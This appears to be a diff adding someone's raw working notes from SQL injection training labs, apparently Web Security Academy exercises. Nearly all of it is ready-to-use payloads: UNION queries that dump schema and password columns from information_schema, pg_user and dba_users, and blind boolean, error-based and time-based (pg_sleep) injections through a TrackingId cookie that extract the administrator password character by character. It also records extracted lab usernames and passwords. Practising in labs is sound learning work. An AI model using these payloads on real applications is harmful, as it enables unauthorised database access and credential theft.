@@ -1,0 +1,151 @@
+ Microsoft, MySQL 	SELECT @@version
+Oracle 	SELECT * FROM v$version
+PostgreSQL 	SELECT version() 
+
+
+/filter?category=Pets
+
+' union select table_schema,table_name from information_schema.tables--
+' order by 1#   ---> 2 columns
+
+trying pg_users (schema:pg_catalog)
+
+e.g. SELECT * FROM information_schema.columns WHERE table_name = 'Users'
+
+' union select table_name,column_name from information_schema.columns where tables_name='pg_user'--  OK
+
+' union select usename,passwd from pg_catalog.pg_user--  OK
+
+pg_user:
+
+- usename
+-valuntil
+-useconfig
+-usesuper
+-userepl
+-passwd
+-usebypassrls
+-usesysid
+-usecreatedb
+
+users_vbvlrl
+
+
+' union select column_name,data_type from information_schema.columns where table_name='pg_user'--   OK
+
+
+                           <th>postgres</th>
+                            <td>********</td>
+
+
+
+
+' union select column_name,data_type from information_schema.columns where table_name='users_vbvlrl'-- OK
+
+
+'union select username_falwgd,password_cwqbpe from users_vbvlrl--
+
+
+carlos
+	06a7k90t6qhiyi1u4ykq
+
+administrator
+	txnyvyb1qar9b3ggrxbe
+wiener
+	dywtm7l50zz8d1yzx6rd
+
+
+
+'+union+select+table_name,column_name+FROM+all_tab_columns--   OK
+
+'+union+select+column_name,+FROM+all_tab_columns where table_name='dba_users--
+
+dba_users
+
+' union select username,password from dba_users--
+
+
+
+
+
+' AND SUBSTRING((SELECT password FROM users WHERE username = 'Administrator'), 1, 1) = 's
+
+
+
+Injectable cookie:		'+and+1=2
+check users table exist:	Cookie: TrackingId=LHIaPFlVfcshYz8h'+and+(select+'x'+from+users+limit+1)='x'--
+check administrator exists:	'+and+(select+username+from+users+where+username='administrator')='administrator'--'
+get length of password:		'+and+(select+username+from+users+where+username%3d'administrator'+and+length(password)=§x§)%3d'administrator'-- 20 digits
+Guess password			
+
+' and (select username from users where username='administrator' and substring(password1,1)=a)='administrator'--
+
+' and (SELECT CASE WHEN (username = 'administrator' AND length(password)=1) THEN 1/0 ELSE 'a' END FROM users)='a
+
+
+' and (SELECT CASE WHEN (username = 'administrator' AND length(password)>50) THEN 1/0 ELSE 'a' END FROM users)='a
+
+
+users table exist?		 		|| (select '' from users where rownum=1) || '
+administrator exists in users table:		' || (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users where username='administrator') || '
+						error code 500 => administrator exists
+							   200 => administrator does not exist
+get password length:				' || (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users where username='administrator' and length(password)=20) || '
+
+ex.12
+=====
+
+get password:	 ' || (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users where username='administrator' and substr(password,1,1)='a' || '
+
+		"' || (select CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users where username='administrator' and ascii(substr(password,%s,1))='%s' || '"
+
+ex.13
+=====
+password length:
+
+' || (SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(0) END from users where username='administrator' and length(password)=20)--  ---- OK
+
+' || (SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(0) END from users where username='administrator' and substring(password,1,1)='a' || '  ---- OK
+
+' || (SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(0) END from users where username='administrator' and substring(password,1,1)='H' || '
+
+
+' || (SELECT CASE WHEN (username='administrator' and substring(password,1,1)='6') THEN pg_sleep(5) ELSE pg_sleep(0) END from users)--
+
+
+	       | |
+         123456789
+6fb3bxd7u28kx7u5bZcq
+6fb3bxd7u28kx7uabscq
+
+
+
+
+16 --> a
+18 --> s
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+                                                                                                                                                                       
